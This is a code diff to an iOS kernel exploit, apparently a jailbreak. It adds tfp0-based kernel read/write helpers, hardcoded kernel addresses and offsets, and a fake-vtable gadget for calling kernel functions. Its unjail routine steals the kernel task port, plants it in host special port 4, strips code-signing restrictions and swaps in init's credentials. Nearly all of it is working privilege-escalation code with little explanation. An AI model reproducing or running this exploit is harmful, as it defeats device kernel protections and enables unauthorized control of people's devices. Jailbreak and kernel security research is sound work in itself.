@@ -604,6 +604,7 @@ uint64_t prepare_kernel_rw() {
 
 int jb_go() {
   uint64_t kernel_base = prepare_kernel_rw();
+#if 0
   uint64_t val = rk64(kernel_base);
   printf("read from kernel memory: 0x%016llx\n", val);
   
@@ -615,4 +616,259 @@ int jb_go() {
   printf("read back: 0x%016llx\n", read_back);
   
   return 42;
+#else
+  extern int unjail(void);
+  return kernel_base ? unjail() : -1;
+#endif
+}
+
+/*****************************************************************************/
+
+const unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
+const unsigned offsetof_task = 0x18;                // proc_t::task
+const unsigned offsetof_p_ucred = 0x100;            // proc_t::p_ucred
+const unsigned offsetof_p_csflags = 0x2a8;          // proc_t::p_csflags
+const unsigned offsetof_itk_self = 0xD8;            // task_t::itk_self (convert_task_to_port)
+const unsigned offsetof_itk_sself = 0xE8;           // task_t::itk_sself (task_get_special_port)
+const unsigned offsetof_itk_bootstrap = 0x2b8;      // task_t::itk_bootstrap (task_get_special_port)
+const unsigned offsetof_ip_mscount = 0x9C;          // ipc_port_t::ip_mscount (ipc_port_make_send)
+const unsigned offsetof_ip_srights = 0xA0;          // ipc_port_t::ip_srights (ipc_port_make_send)
+const unsigned offsetof_special = 2 * sizeof(long); // host::special
+
+const uint64_t allproc = 0xfffffff0075f0178;
+const uint64_t realhost = 0xfffffff00757c898;
+const uint64_t surfacevt = 0xfffffff006e521e0;
+const uint64_t call5 = 0xfffffff006337e10;
+
+mach_port_t tfp0 = 0;
+
+static uint64_t our_proc = 0;
+static uint64_t init_proc = 0;
+static uint64_t kern_proc = 0;
+static uint64_t kern_task = 0;
+
+vm_size_t
+kread(vm_address_t where, uint8_t *p, vm_size_t size)
+{
+    int rv;
+    size_t offset = 0;
+    while (offset < size) {
+        vm_size_t sz, chunk = 2048;
+        if (chunk > size - offset) {
+            chunk = size - offset;
+        }
+        rv = vm_read_overwrite(tfp0, where + offset, chunk, (vm_address_t)(p + offset), &sz);
+        if (rv || sz == 0) {
+            fprintf(stderr, "[e] error reading kernel @0x%zx\n", offset + where);
+            break;
+        }
+        offset += sz;
+    }
+    return offset;
+}
+
+uint64_t
+kread_uint64(vm_address_t where)
+{
+    uint64_t value = 0;
+    vm_size_t sz = kread(where, (uint8_t *)&value, sizeof(value));
+    return (sz == sizeof(value)) ? value : 0;
+}
+
+uint32_t
+kread_uint32(vm_address_t where)
+{
+    uint32_t value = 0;
+    vm_size_t sz = kread(where, (uint8_t *)&value, sizeof(value));
+    return (sz == sizeof(value)) ? value : 0;
+}
+
+vm_size_t
+kwrite(vm_address_t where, const uint8_t *p, vm_size_t size)
+{
+    int rv;
+    size_t offset = 0;
+    while (offset < size) {
+        vm_size_t chunk = 2048;
+        if (chunk > size - offset) {
+            chunk = size - offset;
+        }
+        rv = vm_write(tfp0, where + offset, (vm_offset_t)p + offset, chunk);
+        if (rv) {
+            fprintf(stderr, "[e] error writing kernel @0x%zx\n", offset + where);
+            break;
+        }
+        offset += chunk;
+    }
+    return offset;
+}
+
+vm_size_t
+kwrite_uint64(vm_address_t where, uint64_t value)
+{
+    return kwrite(where, (uint8_t *)&value, sizeof(value));
+}
+
+vm_size_t
+kwrite_uint32(vm_address_t where, uint32_t value)
+{
+    return kwrite(where, (uint8_t *)&value, sizeof(value));
+}
+
+void kx2(uint64_t fptr, uint64_t arg1, uint64_t arg2) {
+  uint64_t r_obj[9];
+  r_obj[0] = kernel_buffer_base+0x8;  // fake vtable points 8 bytes into this object
+  r_obj[1] = 0x20003;                 // refcount
+  r_obj[2] = arg1;                    // obj + 0x10 -> rdi (memmove dst)
+  r_obj[3] = arg2;                    // obj + 0x18 -> rsi (memmove src)
+  r_obj[4] = fptr;                    // obj + 0x20 -> fptr
+  r_obj[5] = ret;                     // vtable + 0x20 (::retain)
+  r_obj[6] = osserializer_serialize;  // vtable + 0x28 (::release)
+  r_obj[7] = 0x0;                     //
+  r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
+
+  kwrite(kernel_buffer_base, (uint8_t *)r_obj, sizeof(r_obj));
+
+  io_service_t service = MACH_PORT_NULL;
+  kern_return_t err = IOConnectGetService(target_uc, &service);
+
+  kwrite(kernel_buffer_base, (uint8_t *)legit_object, sizeof(r_obj));
+}
+
+uint32_t
+kx5(uint64_t fptr, uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4, uint64_t arg5)
+{
+/*
+__text:FFFFFFF006337E10
+    STP     X22, X21, [SP,#-0x30]!
+    STP     X20, X19, [SP,#0x10]
+    STP     X29, X30, [SP,#0x20]
+    ADD     X29, SP, #0x20
+    MOV     X19, X1
+    MOV     X20, X0
+    LDR     X21, [X20,#0xB0]
+    LDR     X8, [X19]
+    STR     X8, [X20,#0xB0]
+    LDP     X0, X8, [X19,#8]
+    LDP     X1, X2, [X19,#0x18]
+    LDP     X3, X4, [X19,#0x28]
+    BLR     X8
+    STR     W0, [X19,#0x38]
+    STR     X21, [X20,#0xB0]
+    MOV     W0, #0
+    LDP     X29, X30, [SP,#0x20]
+    LDP     X20, X19, [SP,#0x10]
+    LDP     X22, X21, [SP],#0x30
+    RET
+*/
+  uint64_t where = kernel_buffer_base + 0xF00;
+  uint64_t args[8];
+  args[0] = 0;
+  args[1] = arg1;
+  args[2] = fptr;
+  args[3] = arg2;
+  args[4] = arg3;
+  args[5] = arg4;
+  args[6] = arg5;
+  args[7] = 0;
+  kwrite(where, (uint8_t *)args, sizeof(args));
+  kx2(call5 + kaslr_shift, where - 0xB0, where);
+  return kread_uint32(where + 0x38);
+}
+
+#define	CS_VALID		0x0000001	/* dynamically valid */
+#define CS_ADHOC		0x0000002	/* ad hoc signed */
+#define CS_GET_TASK_ALLOW	0x0000004	/* has get-task-allow entitlement */
+#define CS_INSTALLER		0x0000008	/* has installer entitlement */
+
+#define	CS_HARD			0x0000100	/* don't load invalid pages */
+#define	CS_KILL			0x0000200	/* kill process if it becomes invalid */
+#define CS_CHECK_EXPIRATION	0x0000400	/* force expiration checking */
+#define CS_RESTRICT		0x0000800	/* tell dyld to treat restricted */
+#define CS_ENFORCEMENT		0x0001000	/* require enforcement */
+#define CS_REQUIRE_LV		0x0002000	/* require library validation */
+#define CS_ENTITLEMENTS_VALIDATED	0x0004000
+
+#define	CS_ALLOWED_MACHO	0x00ffffe
+
+#define CS_EXEC_SET_HARD	0x0100000	/* set CS_HARD on any exec'ed process */
+#define CS_EXEC_SET_KILL	0x0200000	/* set CS_KILL on any exec'ed process */
+#define CS_EXEC_SET_ENFORCEMENT	0x0400000	/* set CS_ENFORCEMENT on any exec'ed process */
+#define CS_EXEC_SET_INSTALLER	0x0800000	/* set CS_INSTALLER on any exec'ed process */
+
+#define CS_KILLED		0x1000000	/* was killed by kernel for invalidity */
+#define CS_DYLD_PLATFORM	0x2000000	/* dyld used to load this is a platform binary */
+#define CS_PLATFORM_BINARY	0x4000000	/* this is a platform binary */
+#define CS_PLATFORM_PATH	0x8000000	/* platform binary by the fact of path (osx only) */
+
+int
+unjail(void)
+{
+    uint32_t our_pid = getpid();
+    uint64_t our_task = 0;
+    uint64_t proc = rk64(allproc + kaslr_shift);
+    while (proc) {
+        uint32_t pid = (uint32_t)rk64(proc + offsetof_p_pid);
+        if (pid == our_pid) {
+            our_proc = proc;
+        } else if (pid == 1) {
+            init_proc = proc;
+        } else if (pid == 0) {
+            kern_proc = proc;
+        }
+        proc = rk64(proc);
+    }
+    our_task = rk64(our_proc + offsetof_task);
+    kern_task = rk64(kern_proc + offsetof_task); /* rk64((_kernel_task = 0xfffffff0075f6050) + kaslr_shift) */
+
+    // our_task->itk_bootstrap = kernel_task->itk_sself
+    uint64_t itk_sself = rk64(kern_task + offsetof_itk_sself);
+    uint64_t tmp = rk64(our_task + offsetof_itk_bootstrap);
+    wk64(our_task + offsetof_itk_bootstrap, itk_sself);
+    int rv = task_get_special_port(mach_task_self(), 4, &tfp0);
+    wk64(our_task + offsetof_itk_bootstrap, tmp);
+    if (rv != KERN_SUCCESS || tfp0 == 0) {
+        printf("tfp0 FAILED: rv = %s, tfp = 0x%x\n", mach_error_string(rv), tfp0);
+        return -1;
+    }
+    printf("tfp0 = 0x%x\n", tfp0);
+
+    // first_port and second_port *should be* contiguous (if they aren't, we'll DIAF)
+    // since second_port is at kernel_buffer_base, then first_port is at kernel_buffer_base - 4096
+    // we have to fix first_port size, otherwise the kernel will panic upon exit (free to wrong zone)
+    kwrite_uint64(kernel_buffer_base - 4096, 0xc40);
+
+    // rk64/wk64 are disabled, use tfp0
+
+    const int slot = 4;
+    // host_priv_self()->special[4] = convert_task_to_port(proc_find(0)->task)
+    // that is: realhost.special[4] = ipc_port_make_send(kernel_task->itk_self)
+    uint64_t itk_self = kread_uint64(kern_task + offsetof_itk_self);
+    // XXX lock, reference++
+    uint32_t ip_mscount = kread_uint32(itk_self + offsetof_ip_mscount);
+    uint32_t ip_srights = kread_uint32(itk_self + offsetof_ip_srights);
+    ip_mscount++;
+    ip_srights++;
+    kwrite_uint32(itk_self + offsetof_ip_mscount, ip_mscount);
+    kwrite_uint32(itk_self + offsetof_ip_srights, ip_srights);
+    kwrite_uint64(realhost + offsetof_special + slot * sizeof(long) + kaslr_shift, itk_self);
+    /// host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &tfp0);
+
+    // grant ourselves some power
+    uint32_t csflags = kread_uint32(our_proc + offsetof_p_csflags);
+    kwrite_uint32(our_proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_KILL | CS_HARD));
+    uint64_t our_cred = kread_uint64(our_proc + offsetof_p_ucred);
+    uint64_t init_cred = kread_uint64(init_proc + offsetof_p_ucred);
+    kwrite_uint64(our_proc + offsetof_p_ucred, init_cred);
+
+#if 1
+    uint64_t val = kread_uint64(kernel_base);
+    printf("read from kernel memory: 0x%016llx\n", val);
+#else
+    extern int unjail2(uint64_t surfacevt);
+    rv = unjail2(surfacevt);
+#endif
+
+    kwrite_uint64(our_proc + offsetof_p_ucred, our_cred);
+    return rv;
 }
